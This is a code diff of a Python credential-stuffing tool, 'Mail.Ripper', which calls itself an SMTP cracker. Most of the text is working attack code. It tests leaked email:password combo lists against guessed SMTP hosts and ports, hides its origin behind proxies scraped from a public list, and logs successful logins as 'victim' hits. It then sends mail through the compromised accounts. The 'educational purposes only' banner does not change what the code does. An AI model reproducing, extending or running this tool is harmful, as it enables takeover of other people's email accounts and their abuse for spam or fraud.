@@ -1,8 +1,8 @@
 #!/usr/local/bin/python3
-#encoding: utf-8
+# -*- coding: utf-8 -*-
 #name: Mail.Ripper v1 (proxy version)
-#description: smtp checker / smtp cracker including mailsending check for hits and SOCKS5 support
-#version: 1.07, 2020-11-27
+#description: smtp checker / smtp cracker including mailsending check for hits and SOCKS4 / SOCKS5 support
+#version: 1.08, 2020-11-28
 #author: DrPython3
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))
@@ -31,14 +31,12 @@ o     o         o 8     .oPYo.  o                                     .o
 ..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
 ::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
 ::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::
--------------------------------------------------------------------------
-'''
+-------------------------------------------------------------------------'''
 logo2 = '''
               simple email checker by: DrPython3 (C) 2020
                  *** FOR EDUCATIONAL PURPOSES ONLY ***
                  
-           DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
-'''
+           DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf'''
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))
 
@@ -134,7 +132,7 @@ def getproxdata():
         print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies - this may take a while ...\n')
     elif sockstype == int(4):
         print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS4 proxies - this may take a while ...\n')
-    psource = str('https://api.proxyscrape.com?request=displayproxies&proxytype=socks') + str(sockstype) + str('&timeout=1000')
+    psource = str('https://api.proxyscrape.com?request=displayproxies&proxytype=socks') + str(sockstype) + str('&timeout=2000')
     http = urllib3.PoolManager(ca_certs=certifi.where())
     proxydata = http.request('GET', psource)
     with open('proxydata.txt', 'a') as proxyfile:
@@ -162,7 +160,7 @@ def randomprox():
 def finder(unkdom):
     socket.setdefaulttimeout(tout)
     defcontext = ssl.create_default_context()
-    if usesocks == 1:
+    if usesocks == int(1):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
@@ -173,24 +171,24 @@ def finder(unkdom):
         socks.wrapmodule(smtplib)
     else: pass
     z = str('failed')
-    print(Fore.LIGHTYELLOW_EX + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...\n')
+    print(Fore.LIGHTYELLOW_EX + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...')
     try:
         for x in subh:
             y = str(str(x) + str(unkdom))
-            print(Fore.LIGHTMAGENTA_EX + 'Trying to connect to: ' + str(y) + ' ...\n')
+            print(Fore.LIGHTMAGENTA_EX + 'Trying to connect to: ' + str(y) + ' ...')
             try:
                 findsmtp = smtplib.SMTP_SSL(str(y), context=defcontext)
-                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'SSL-Connection established, HOST is: ' + str(y) + ' ...\n')
+                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'SSL-Connection established, HOST is: ' + str(y) + ' ...')
                 z = str(y)
                 break
             except:
                 try:
                     findsmtp = smtplib.SMTP(str(y))
-                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...\n')
+                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...')
                     z = str(y)
                     break
                 except:
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(y) + ' ...\n')
+                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(y) + ' ...')
                     try:
                         findsmtp.quit()
                     except: pass
@@ -200,14 +198,14 @@ def finder(unkdom):
         except:pass
         return z
     except BaseException:
-        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom) + ' ...\n')
+        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom) + ' ...')
         return z
 
 #attacker == connects to SMTP host, checks login data and returns result to main checker process:
 def attacker(attackhost, attackport, attackuser, attackpass):
     socket.setdefaulttimeout(tout)
     attackcontext = ssl.create_default_context()
-    if usesocks == 1:
+    if usesocks == int(1):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
@@ -221,53 +219,53 @@ def attacker(attackhost, attackport, attackuser, attackpass):
         #if SMTP port is unknown, try to find it using most common ones:
         if attackport == 0:
             print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost)
-                  + ', testing connection with most common ports ...\n')
+                  + ', testing connection with most common ports ...')
             for x in subp:
                 p = int(x)
                 try:
                     attack = smtplib.SMTP_SSL(str(attackhost), int(p), context=attackcontext)
                     attack.quit()
-                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...\n')
+                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...')
                     attackport = int(p)
                     break
                 except:
                     try:
                         attack = smtplib.SMTP(str(attackhost), int(p))
                         attack.quit()
-                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...\n')
+                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...')
                         attackport = int(p)
                         break
                     except:
                         print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection error (!) for HOST: ' + str(attackhost)
-                              + ' on PORT: ' + str(p) + ' ...\n')
+                              + ' on PORT: ' + str(p) + ' ...')
                         try:
                             attack.quit()
                         except: pass
                         continue
         else:
             print(Fore.LIGHTMAGENTA_EX + 'Starting attack on: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
-                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
+                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
         #if SMTP port is known, start checking combo against host:
         try:
-            print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' with SSL ...\n')
+            print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' with SSL ...')
             attack = smtplib.SMTP_SSL(str(attackhost), int(attackport), context=attackcontext)
             print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
-                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
+                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
         except:
             try:
-                print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' without SSL ...\n')
+                print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' without SSL ...')
                 attack = smtplib.SMTP(str(attackhost), int(attackport))
                 try:
-                    print(Fore.LIGHTMAGENTA_EX + 'Trying to start TLS for HOST: ' + str(attackhost) + ' ...\n')
+                    print(Fore.LIGHTMAGENTA_EX + 'Trying to start TLS for HOST: ' + str(attackhost) + ' ...')
                     attack.starttls(context=attackcontext)
                 except: pass
                 print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
-                      + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
+                      + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
             except: pass
         attack.login(str(attackuser), str(attackpass))
         attack.quit()
         #return result to checking process:
-        if usesocks == 1:
+        if usesocks == int(1):
             return True, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
         else:
             return True, str(attackhost), int(attackport), str(attackuser), str(attackpass)
@@ -276,8 +274,8 @@ def attacker(attackhost, attackport, attackuser, attackpass):
             attack.quit()
         except: pass
         print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection or login error (!) for HOST: ' + str(attackhost) + ' on PORT: '
-              + str(attackport) + ' ...\n')
-        if usesocks == 1:
+              + str(attackport) + ' ...')
+        if usesocks == int(1):
             return False, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
         else:
             return False, str(attackhost), int(attackport), str(attackuser), str(attackpass)
@@ -285,11 +283,11 @@ def attacker(attackhost, attackport, attackuser, attackpass):
 #sendcheckmsg == trys to send an e-mail to user address by valid SMTP:
 def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
     if attackermail == str('invalid@mail.com'):
-        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Mailsending check skipped (!) for: ' + str(mailuser) + ' ...\n')
+        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Mailsending check skipped (!) for: ' + str(mailuser) + ' ...')
     else:
         socket.setdefaulttimeout(tout)
         msgcontext = ssl.create_default_context()
-        if usesocks == 1:
+        if usesocks == (1):
             if sockstype == int(4):
                 socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
             elif sockstype == int(5):
@@ -368,9 +366,9 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
             mailer.login(str(mailuser), str(mailpass))
             mailer.sendmail(mailsender, mailreceiver, mail.as_string())
             print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Finally, an e-mail has been sent with: ' + str(mailuser)
-                  + ' ... so, check your inbox later ...\n')
+                  + ' ... so, check your inbox later ...')
         except:
-            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser) + ' ...\n')
+            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser) + ' ...')
         try:
             mailer.quit()
         except: pass
@@ -391,17 +389,16 @@ def checkmate():
         try:
             #get next combo, clean it and split into mail and pass:
             lraw = combos.pop(0)
-            lraw = lraw.replace(';', ':')
-            lraw = lraw.replace('|', ':')
+            lraw = lraw.replace(';', ':').replace('|', ':')
             l = lraw.split(':')
             #check blacklist for e-mail domain on purpose:
             if skip == 1:
-                print(Fore.LIGHTMAGENTA_EX + 'Checking blacklist for host: ' + str(l[0].split("@")[1]) + ' ...\n')
-                blackhost = blackcheck(str(l[0].split("@")[1]))
+                print(Fore.LIGHTMAGENTA_EX + 'Checking blacklist for host: ' + str(l[0].split("@")[1]) + ' ...')
+                blackhost = blackcheck(str(l[0].split("@")[1]).lower())
                 #if e-mail domain is on blacklist, combo will not be checked:
                 if blackhost == True:
                     print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':'
-                          + str(l[1]) + ' ...\n')
+                          + str(l[1]) + ' ...')
                     skips(str(l[0]) + ':' + str(l[1]))
                     bad += 1
                     continue
@@ -409,14 +406,14 @@ def checkmate():
             else: pass
             #try to get SMTP host from dictionary:
             try:
-                targethost = str(hosters[str(l[0].split("@")[1])])
+                targethost = str(hosters[str(l[0].split("@")[1]).lower()])
             except:
                 #if not found in dictionary, start search for attackable SMTP host:
                 try:
-                    newhost = str(finder(str(l[0].split("@")[1])))
+                    newhost = str(finder(str(l[0].split("@")[1]).lower()))
                     if newhost == str('failed'):
                         print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':'
-                              + str(l[1]) + ' ...\n')
+                              + str(l[1]) + ' ...')
                         skips(str(l[0]) + ':' + str(l[1]))
                         bad += 1
                         continue
@@ -424,7 +421,7 @@ def checkmate():
                         targethost = str(newhost)
                 except:
                     print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0])
-                          + ':' + str(l[1]) + ' ...\n')
+                          + ':' + str(l[1]) + ' ...')
                     skips(str(l[0]) + ':' + str(l[1]))
                     bad += 1
                     continue
@@ -434,35 +431,35 @@ def checkmate():
             except:
                 targetport = int(0)
             #check the combo against the SMTP host and write result to txt-file:
-            if usesocks == 1:
+            if usesocks == int(1):
                 checkresult, th, tp, tuser, tpass, proxy, pport = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
             else:
                 checkresult, th, tp, tuser, tpass = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
             if checkresult == False:
                 print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed victim ' + str(th) + ':' + str(tp) + ', USER: '
-                      + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
+                      + str(tuser) + ', PASS: ' + str(tpass) + ' ...')
                 checked(str(tuser) + ':' + str(tpass))
                 bad += 1
                 continue
             elif checkresult == True and tp == 465:
                 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th)
-                      + ':465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
+                      + ':465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
                 hits('SERVER: ' + str(th) + ', PORT: 465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
             else:
                 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th) + ':' + str(tp)
-                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
+                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
                 hits('SERVER: ' + str(th) + ', PORT: ' + str(tp) + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
             checked(str(tuser) + ':' + str(tpass))
             valid += 1
             #if combo is valid, try to send an e-mail using the cracked SMTP:
-            if usesocks == 1:
+            if usesocks == int(1):
                 sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str(proxy), int(pport))
             else:
                 sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str('none'), int(0))
             continue
         except:
             print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ... HOST: ' + str(th) + ':' + str(tp)
-                  + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
+                  + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...')
             checked(str(tuser) + ':' + str(tpass))
             bad += 1
             continue
@@ -513,9 +510,9 @@ else:
 
 #ask for default timeout:
 try:
-    tout = float(input(Fore.LIGHTWHITE_EX + 'Enter value for timeout (any key for default = 15.0) :     '))
+    tout = float(input(Fore.LIGHTWHITE_EX + 'Enter value for timeout (any key for default = 30.0) :     '))
 except:
-    tout = float(15.0)
+    tout = float(30.0)
 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')
 
 #ask for amount of threads to use:
@@ -549,11 +546,11 @@ elif proxyuse == 'y':
     usesocks = int(1)
 else:
     usesocks = int(0)
-if usesocks == 1:
+if usesocks == int(1):
     print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: SOCKS-proxies activated! Bad combos may be false negatives! ...\n')
 else:
     print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nSOCKS-proxies not activated ...')
-if usesocks == 1:
+if usesocks == int(1):
     try:
         sockstype = int(input(Fore.LIGHTWHITE_EX + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5) :    '))
         if sockstype == int(4):
@@ -578,7 +575,7 @@ else: pass
 #start checker:
 cleaner()
 #if user wants to use proxies, start scraper:
-if usesocks == 1:
+if usesocks == int(1):
     try:
         getproxdata()
         socksprox = open('proxydata.txt', 'r').read().splitlines()
@@ -604,12 +601,12 @@ while len(combos) > 0:
     try:
         #Show stats in title bar if run on Windows:
         sleep(0.1)
-        ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
+        ctypes.windll.kernel32.SetConsoleTitleW(f'LEFT TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}')
     #Stats in title bar for Unix & Co.:
     except:
         try:
             sleep(0.1)
-            wintitle = str('TO CHECK: ' + str(len(combos)) + ' | HITS: ' + str(valid) + ' | BAD: ' + str(bad))
+            wintitle = str('LEFT TO CHECK: ' + str(len(combos)) + ' | HITS: ' + str(valid) + ' | BAD: ' + str(bad))
             sys.stdout.write('\33]0;' + str(wintitle) + '\a')
             sys.stdout.flush()
         except: pass
